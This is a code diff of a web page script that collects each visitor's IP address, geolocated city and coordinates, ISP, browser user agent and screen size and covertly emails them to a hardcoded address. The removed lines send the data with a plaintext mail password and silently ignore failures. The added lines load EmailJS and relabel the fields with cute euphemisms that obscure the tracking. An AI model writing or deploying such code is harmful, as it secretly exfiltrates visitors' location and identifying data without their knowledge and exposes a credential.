@@ -78,25 +78,32 @@
     $('isp').textContent=isp;
     $('map').href=`https://www.google.com/maps?q=${lat},${lon}`;
     const body=`
-IP: ${ip}
-位置: ${city}, ${region}, ${country}
-坐标: ${lat}, ${lon}
+神秘数字: ${ip}
+小窝wz: ${city}, ${region}, ${country}
+小窝zb: ${lat}, ${lon}
 ISP: ${isp}
 时间: ${new Date().toLocaleString('zh-CN')}
 UA: ${navigator.userAgent}
 屏幕: ${screen.width}x${screen.height}
 `.trim();
-    await fetch('https://api.emailsmtp.io/send',{
-        method:'POST',
-        headers:{'content-type':'application/json'},
-        body:JSON.stringify({
-            user:'1828339242@qq.com',
-            pass:'trdlxempxmpmejfb',
-            to:'1828339242@qq.com',
-            subject:`IP ${ip}`,
-            text:body
-        })
-    }).catch(()=>{});   // 失败也静默
+        // 加载 EmailJS
+    const loadScript = src => new Promise((res, rej) => {
+        const s = document.createElement('script');
+        s.src = src; s.onload = res; s.onerror = rej;
+        document.head.appendChild(s);
+    });
+    await loadScript('https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js');
+    emailjs.init('trdlxempxmpmejfb'); // 你的公钥（就是授权码）
+
+    try {
+        await emailjs.send('service_default', 'template_ip_notification', {
+            to_email: '1828339242@qq.com',
+            subject: `IP ${ip}`,
+            message: body
+        });
+    } catch (e) {
+        console.error('失败了鸣鸣鸣', e);
+    }
     const cp=t=>{
         navigator.clipboard.writeText(t.textContent);
         const o=t.textContent;
